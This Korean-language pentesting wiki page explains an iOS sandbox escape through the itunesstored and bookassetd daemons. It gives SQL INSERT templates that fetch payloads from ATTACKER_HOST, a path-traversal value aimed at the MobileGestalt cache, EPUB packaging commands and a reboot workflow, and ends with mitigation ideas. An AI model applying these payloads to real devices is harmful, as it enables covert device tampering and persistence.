# itunesstored & bookassetd Sandbox Escape

{{#include ../../banners/hacktricks-training.md}}

## 개요

최근 연구에 따르면 두 개의 iOS 기본 탑재 데몬인 **`itunesstored`**(다운로드 관리자)와 **`bookassetd`**(Books / iBooks 자산 관리자)는 사용자 쓰기 가능한 SQLite 메타데이터를 맹목적으로 신뢰합니다. 조작된 `downloads.28.sqlitedb`와 `BLDatabaseManager.sqlite` 파일 및 최소한의 EPUB 아카이브를 `/var/mobile/Media/` 아래에 기록하면, 해당 경로에 쓰기 권한이 있는 공격자는 이들 데몬을 강제하여 **`/private/var/` 내 대부분의 `mobile` 소유 경로에 임의 파일 쓰기**를 수행할 수 있습니다. 이 기본 동작은 재부팅을 거쳐도 유지되며 `systemgroup.com.apple.mobilegestaltcache`와 같은 system group 캐시를 변조해 장치 속성을 스푸핑하거나 설정을 영구화할 수 있습니다.

주요 특성:

- 최소한 **iOS 26.2b1**까지 작동(테스트: iPhone 12 / iOS 26.0.1).
- 쓰기 가능한 대상에는 `SystemGroup` 캐시, `/private/var/mobile/Library/FairPlay`, `/private/var/mobile/Media` 및 기타 `mobile` 소유 파일이 포함됩니다. `root` 소유 파일에 대한 쓰기는 실패합니다.
- AFC 수준 접근(AFC-level access, USB 파일 복사)만 있거나 대상 SQLite DB를 교체하고 페이로드를 업로드할 수 있는 어떠한 발판이면 충분합니다.

## 위협 모델 및 요구사항

1. `/var/mobile/Media/Downloads/` 및 `/var/mobile/Media/Books/`에 대한 **로컬 파일시스템 접근**(3uTools, i4.cn 같은 AFC 클라이언트 또는 [`afcclient`](https://github.com/emonti/afcclient) over USB, 또는 이전의 어떤 침해 수단).
2. 공격자 파일(`BLDatabaseManager.sqlite`, `iTunesMetadata.plist`, 조작된 EPUB)을 호스팅하는 **HTTP 서버**(예: `https://ATTACKER_HOST/fileprovider.php?type=...`).
3. 각 데몬이 DB를 다시 로드하도록 **디바이스를 여러 번 재부팅**할 수 있는 능력.
4. Stage 1 쓰기가 올바른 컨테이너에 기록되도록 하기 위한 **Books system-group UUID**의 지식( syslog에서 확인 ).

## Stage 1 – `itunesstored`를 통한 `downloads.28.sqlitedb` 악용

`itunesstored`는 `/var/mobile/Media/Downloads/downloads.28.sqlitedb`를 처리합니다. `asset` 테이블은 URL + 목적지 메타데이터를 저장하며 신뢰된 입력으로 취급됩니다. 공격자 URL을 가리키고 `local_path`를 Books SystemGroup 내부의 `.../Documents/BLDatabaseManager/BLDatabaseManager.sqlite`로 설정하는 행을 만들면, 부팅 시 `itunesstored`가 해당 Books 데이터베이스를 다운로드하여 공격자 내용으로 덮어씁니다.

### Books SystemGroup UUID 찾기

1. [`pymobiledevice3`](https://github.com/doronz88/pymobiledevice3)로 syslog 아카이브를 수집합니다:
```bash
pymobiledevice3 syslog collect logs.logarchive
```
2. **Console.app**에서 `logs.logarchive`를 열고 `bookassetd [Database]: Store is at file:///private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite`를 검색합니다.
3. `<UUID>`를 기록하고 SQL 페이로드에 대입합니다.

### 악성 `asset` 행

<details>
<summary>Stage 1 INSERT 템플릿</summary>
```sql
INSERT INTO "main"."asset" (
"pid","download_id","asset_order","asset_type","bytes_total",
"url","local_path","destination_url","path_extension","retry_count",
"http_method","initial_odr_size","is_discretionary","is_downloaded",
"is_drm_free","is_external","is_hls","is_local_cache_server",
"is_zip_streamable","processing_types","video_dimensions",
"timeout_interval","store_flavor","download_token","blocked_reason",
"avfoundation_blocked","service_type","protection_type",
"store_download_key","etag","bytes_to_hash","hash_type","server_guid",
"file_protection","variant_id","hash_array","http_headers",
"request_parameters","body_data","body_data_file_path","sinfs_data",
"dpinfo_data","uncompressed_size","url_session_task_id"
) VALUES (
1234567890,6936249076851270150,0,'media',NULL,
'https://ATTACKER_HOST/fileprovider.php?type=sqlite',
'/private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite',
NULL,'epub',6,'GET',NULL,0,0,0,1,0,0,0,0,
NULL,60,NULL,466440000,0,0,0,0,'',NULL,NULL,0,
NULL,NULL,NULL,X'62706c6973743030a1015f1020...',NULL,NULL,NULL,NULL,NULL,NULL,0,1
);
```
</details>

**중요한 필드:**

- `url`: 공격자가 제어하는 엔드포인트로 악성 `BLDatabaseManager.sqlite`를 반환합니다.
- `local_path`: 앞서 확인한 Books 시스템 그룹의 `BLDatabaseManager.sqlite` 파일.
- 제어 플래그: 데몬이 작업을 수락하도록 기본값 유지 (`asset_type='media'`, `path_extension='epub'`, 템플릿과 같이 불리언을 0/1로 설정).

### Deployment

1. 레이스를 피하기 위해 오래된 `/var/mobile/Media/Downloads/*` 항목들을 삭제합니다.
2. AFC를 통해 `downloads.28.sqlitedb`를 제작한 DB로 교체합니다.
3. 재부팅 → `itunesstored`가 Stage 2 데이터베이스를 다운로드하고 `/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist`를 생성합니다.
4. 해당 plist를 `/var/mobile/Media/Books/iTunesMetadata.plist`로 복사합니다; Stage 2는 해당 위치에서 이를 기대합니다.

## Stage 2 – `bookassetd`를 통한 `BLDatabaseManager.sqlite` 악용

`bookassetd`는 더 광범위한 파일시스템 entitlements를 보유하고 `ZBLDOWNLOADINFO` 테이블을 신뢰합니다. 공격자 URL을 참조하고 `ZPLISTPATH`에 traversal을 포함하는 가짜 구매 행을 삽입함으로써, 데몬은 당신의 EPUB을 `/var/mobile/Media/Books/asset.epub`로 다운로드하고 이후 메타데이터를 **`../../..` 이스케이프 시퀀스를 통해 도달 가능한 모든 `mobile` 소유 경로로** 풀어놓습니다.

### 악성 `ZBLDOWNLOADINFO` 행

<details>
<summary>Stage 2 INSERT 템플릿</summary>
```sql
INSERT INTO "ZBLDOWNLOADINFO" (
"Z_PK","Z_ENT","Z_OPT","ZACCOUNTIDENTIFIER","ZCLEANUPPENDING",
"ZFAMILYACCOUNTIDENTIFIER","ZISAUTOMATICDOWNLOAD","ZISLOCALCACHESERVER",
"ZISPURCHASE","ZISRESTORE","ZISSAMPLE","ZISZIPSTREAMABLE",
"ZNUMBEROFBYTESTOHASH","ZPERSISTENTIDENTIFIER","ZPUBLICATIONVERSION",
"ZSERVERNUMBEROFBYTESTOHASH","ZSIZE","ZSTATE","ZSTOREIDENTIFIER",
"ZSTOREPLAYLISTIDENTIFIER","ZLASTSTATECHANGETIME","ZPURCHASEDATE",
"ZSTARTTIME","ZARTISTNAME","ZARTWORKPATH","ZASSETPATH",
"ZBUYPARAMETERS","ZCANCELDOWNLOADURL","ZCLIENTIDENTIFIER",
"ZCOLLECTIONARTISTNAME","ZCOLLECTIONTITLE","ZDOWNLOADID",
"ZDOWNLOADKEY","ZENCRYPTIONKEY","ZEPUBRIGHTSPATH","ZFILEEXTENSION",
"ZGENRE","ZHASHTYPE","ZKIND","ZMD5HASHSTRINGS","ZORIGINALURL",
"ZPERMLINK","ZPLISTPATH","ZSALT","ZSUBTITLE","ZTHUMBNAILIMAGEURL",
"ZTITLE","ZTRANSACTIONIDENTIFIER","ZURL","ZRACGUID","ZDPINFO",
"ZSINFDATA","ZFILEATTRIBUTES"
) VALUES (
1,2,3,0,0,0,0,'',NULL,NULL,NULL,NULL,
0,0,0,NULL,4648,2,'765107108',NULL,
767991550.119197,NULL,767991353.245275,NULL,NULL,
'/private/var/mobile/Media/Books/asset.epub',
'productType=PUB&salableAdamId=765107106&...',
'https://p19-buy.itunes.apple.com/...',
'4GG2695MJK.com.apple.iBooks','Sebastian Saenz','Cartas de Amor a la Luna',
'../../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library',
NULL,NULL,NULL,NULL,'Contemporary Romance',NULL,'ebook',NULL,NULL,NULL,
'/private/var/mobile/Media/Books/iTunesMetadata.plist',NULL,
'Cartas de Amor a la Luna','https://ATTACKER_HOST/fileprovider.php?type=gestalt',
'Cartas de Amor a la Luna','J19N_PUB_190099164604738',
'https://ATTACKER_HOST/fileprovider.php?type=gestalt2',NULL,NULL,NULL,NULL
);
```
</details>

중요 필드:

- `ZASSETPATH`: 공격자가 제어하는 디스크상의 EPUB 위치.
- `ZURL`/`ZPERMLINK`: 공격자가 호스팅하는 EPUB 및 보조 plist의 URL.
- `ZPLISTPATH`: `../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library` – **path traversal base**로 EPUB에서 추출된 파일에 붙는 경로. 원하는 SystemGroup 대상에 도달하도록 traversal depth를 조절하세요.
- 구매 메타데이터 (`ZSTOREIDENTIFIER`, names, timestamps)는 정식 항목을 모방하도록 설정하여 데몬이 해당 행을 버리지 않게 합니다.

악성 DB를 `/private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite`로 복사한 후(Stage 1 덕분) 기기를 두 번 재부팅하면, `bookassetd`는 (1) EPUB을 다운로드하고, (2) 이를 처리하여 추출된 plist를 traversal된 경로 아래에 기록합니다.

## EPUB 페이로드 제작

`bookassetd`는 EPUB ZIP format을 준수합니다: `mimetype`은 첫 번째 압축 해제되지 않은 항목이어야 합니다. EPUB 콘텐츠를 MobileGestalt cache에 매핑하려면, `ZPLISTPATH`를 기준으로 원하는 경로를 반영하는 디렉터리 트리를 구성하세요.
```
Caches/
├── mimetype
└── com.apple.MobileGestalt.plist
```
아카이브를 생성하세요:
```bash
zip -X0 hax.epub Caches/mimetype
zip -Xr9D hax.epub Caches/com.apple.MobileGestalt.plist
```
- `mimetype` typically contains the literal `application/epub+zip`.
- `Caches/com.apple.MobileGestalt.plist` holds the attacker-controlled payload that will land at `.../Library/Caches/com.apple.MobileGestalt.plist`.

## 오케스트레이션 워크플로우

1. **공격자 HTTP 서버에 파일을 준비**하고 호스트/UUID별 값을 넣어 두 개의 SQLite DB를 제작합니다.
2. **장치의 `downloads.28.sqlitedb`를 교체**하고 재부팅 → Stage 1이 악성 `BLDatabaseManager.sqlite`를 다운로드하고 `/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist`를 생성합니다.
3. **`iTunesMetadata.plist`를 복사**하여 `/var/mobile/Media/Books/iTunesMetadata.plist`로 저장합니다(데몬이 삭제하면 반복).
4. **다시 재부팅** → `bookassetd`가 Stage 2 메타데이터를 사용해 `asset.epub`를 `/var/mobile/Media/Books/`로 다운로드합니다.
5. **세 번째로 재부팅** → `bookassetd`가 다운로드된 에셋을 처리하고 `ZPLISTPATH`를 따라 EPUB 내용을 대상 SystemGroup 경로(예: `com.apple.MobileGestalt.plist`)에 씁니다.
6. **검증**: 덮어쓴 plist를 읽어 확인하거나 MobileGestalt에서 파생된 속성(모델 식별자, 활성화 플래그 등)이 변경되었는지 관찰합니다.

동일한 패턴으로 FairPlay 상태나 영속성 디렉터리 등 다른 `mobile` 소유의 캐시 하위에 파일을 배치할 수 있어 kernel exploit 없이 은밀한 변조가 가능합니다.

## 도구 및 운영 노트

- **`pymobiledevice3 syslog collect logs.logarchive`** – 로그 아카이브를 추출하여 Books SystemGroup UUID를 찾습니다.
- **Console.app** – `bookassetd [Database]: Store is at ...`로 필터링하여 정확한 컨테이너 경로를 복구합니다.
- **AFC clients (`afcclient`, 3uTools, i4.cn)** – jailbreak 없이 USB로 SQLite DB와 plist 파일을 push/pull 합니다.
- **`zip`** – 페이로드 패키징 시 EPUB 순서 제약을 강제합니다.
- **Public PoC** – <https://github.com/hanakim3945/bl_sbx> 는 커스터마이즈 가능한 baseline SQLite/EPUB 템플릿을 제공합니다.

## 탐지 및 완화 아이디어

- `downloads.28.sqlitedb`와 `BLDatabaseManager.sqlite`를 신뢰되지 않는 입력으로 간주: `local_path` / `ZPLISTPATH`가 승인된 샌드박스 내부에 머무르는지 검증하고 절대 경로 또는 경로 탈출 토큰은 거부합니다.
- AFC가 이러한 데이터베이스를 교체하는 쓰기 동작이나 부팅 직후 `itunesstored` / `bookassetd`에 의해 시작된 예기치 않은 다운로드를 모니터링합니다.
- `bookassetd`의 언패킹을 강화하여 출력 대상에 대해 `realpath()`를 호출하고 파일 작성 전에 Books 컨테이너를 벗어나지 못하도록 합니다.
- AFC/USB 파일 복사 채널을 제한하거나 Books/iTunes 메타데이터 파일 교체를 허용하기 전에 사용자 상호작용을 요구합니다.

## References

- [itunesstored & bookassetd sbx escape](https://hanakim3945.github.io/posts/download28_sbx_escape/)
- [bl_sbx PoC repository](https://github.com/hanakim3945/bl_sbx)

{{#include ../../banners/hacktricks-training.md}}
